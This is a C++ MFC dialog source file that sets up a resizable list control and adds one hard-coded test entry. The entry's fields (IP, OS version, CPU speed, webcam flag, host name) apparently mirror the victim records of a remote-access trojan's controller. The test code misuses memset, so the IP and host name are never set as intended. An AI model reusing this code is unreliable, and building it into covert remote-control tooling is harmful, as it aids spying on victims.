// ListDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Princ.h"
#include "ListDlg.h"
#include "afxdialogex.h"


// ListDlg 对话框

IMPLEMENT_DYNAMIC(ListDlg, CDialogEx)

ListDlg::ListDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(ListDlg::IDD, pParent)
{

}

ListDlg::~ListDlg()
{
}

void ListDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LISTCTRL, m_cListCtrl);
}


BEGIN_MESSAGE_MAP(ListDlg, CDialogEx)
	ON_WM_SIZE()
END_MESSAGE_MAP()


// ListDlg 消息处理程序


BOOL ListDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// TODO:  在此添加额外的初始化
	CRect rect;
	m_cListCtrl.GetClientRect(&rect);
	m_cListCtrl.MoveWindow(&rect);
	m_cListCtrl.init();

	LOGININFO log;
	memset(&log,0,sizeof(LOGININFO));
	log.bToken = 1;
	memset(&log.IPAddress,0xc0a80390,sizeof(0xc0a80390));
	log.OsVerInfoEx.dwPlatformId = VER_PLATFORM_WIN32_NT;
	log.OsVerInfoEx.dwMajorVersion = 6;
	log.OsVerInfoEx.dwMinorVersion = 0;
	log.CPUClockMhz = 888;
	log.bIsWebCam = 1;
	log.dwSpeed = 1;
	char * aa = "test host name";
	memset(&log.HostName,(int)aa,sizeof(aa));
	
	m_cListCtrl.AddToList(log);

	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}


void ListDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);
	if(m_cListCtrl.m_hWnd == NULL)
		return;      // Return if window is not created yet.
	CRect rect;
	this->GetWindowRect(&rect);
	ScreenToClient(&rect);  
	m_cListCtrl.MoveWindow(&rect);
	m_cListCtrl.changeWidth();
}
